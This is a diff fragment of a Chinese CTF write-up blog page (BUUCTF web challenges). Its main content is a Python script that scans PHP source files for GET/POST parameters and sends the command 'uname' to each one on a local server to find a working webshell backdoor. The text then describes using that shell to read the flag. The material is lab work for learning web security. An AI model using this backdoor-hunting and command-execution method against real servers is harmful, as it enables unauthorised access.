+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">'/var/www/html/src'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/var/www/html/src/'</span>+name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = list(set(pattern.findall(data)))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        command = <span class="string">'uname'</span></span><br><span class="line">        flag = <span class="string">'Linux'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">            passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">            r = requests.get(url=<span class="string">'http://127.0.0.1:8888/'</span> + name + <span class="string">'?'</span> + passwd + <span class="string">'='</span>+ command)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                print(<span class="string">'GET:  '</span> + passwd)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">            passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">            r = requests.post(url=<span class="string">'http://127.0.0.1:8888/'</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                print(<span class="string">'POST:  '</span> + passwd)</span><br><span class="line">    <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>确实跑了很久，大概在中间位置能看到成功的shell - -</p>
+<p><img src="/img/BUUCTF-WEB/1567769831998.png" alt="1567769831998"></p>
+<p>然后利用这个shell，去cat flag叭~</p>
+<p><img src="/img/BUUCTF-WEB/1567769890029.png" alt="1567769890029"></p>
+<hr>
+
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>Author：<a href="http://yoursite.com">Laurel</a>
-            <p>原文链接：<a href="http://yoursite.com/2019/08/29/Summary-of-Web/">http://yoursite.com/2019/08/29/Summary-of-Web/</a>
-            <p>发表日期：<a href="http://yoursite.com/2019/08/29/Summary-of-Web/">August 29th 2019, 5:16:18 am</a>
-            <p>更新日期：<a href="http://yoursite.com/2019/08/29/Summary-of-Web/">September 6th 2019, 9:15:23 am</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/09/06/BUUCTF-WEB/">http://yoursite.com/2019/09/06/BUUCTF-WEB/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/09/06/BUUCTF-WEB/">September 6th 2019, 11:12:42 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/09/06/BUUCTF-WEB/">September 6th 2019, 9:33:44 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -512,17 +529,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/08/31/SQL-injection-with-raw-MD5-hashes/" title= "SQL injection with raw MD5 hashes">
-                    <div class="nextTitle">SQL injection with raw MD5 hashes</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/08/19/Summary-of-Misc/" title= "Summary of Misc">
-                    <div class="prevTitle">Summary of Misc</div>
+                <a href= "/2019/08/31/SQL-injection-with-raw-MD5-hashes/" title= "SQL injection with raw MD5 hashes">
+                    <div class="prevTitle">SQL injection with raw MD5 hashes</div>
                 </a>
             
         </li>
@@ -676,7 +688,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#№-1-Fuzzing"><span class="toc-number">1.</span> <span class="toc-text">№.1 Fuzzing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#№-2-Wanna-to-see-your-hat"><span class="toc-number">2.</span> <span class="toc-text">№.2 Wanna to see your hat?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#№-3-Hello-World"><span class="toc-number">3.</span> <span class="toc-text">№.3 Hello World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#№-4-Upload"><span class="toc-number">4.</span> <span class="toc-text">№.4 Upload</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#随便注"><span class="toc-number">1.</span> <span class="toc-text">随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#解法一：堆叠注入"><span class="toc-number">1.1.</span> <span class="toc-text">解法一：堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解法二："><span class="toc-number">1.2.</span> <span class="toc-text">解法二：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-tornado"><span class="toc-number">2.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#高明的黑阔"><span class="toc-number">3.</span> <span class="toc-text">高明的黑阔</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
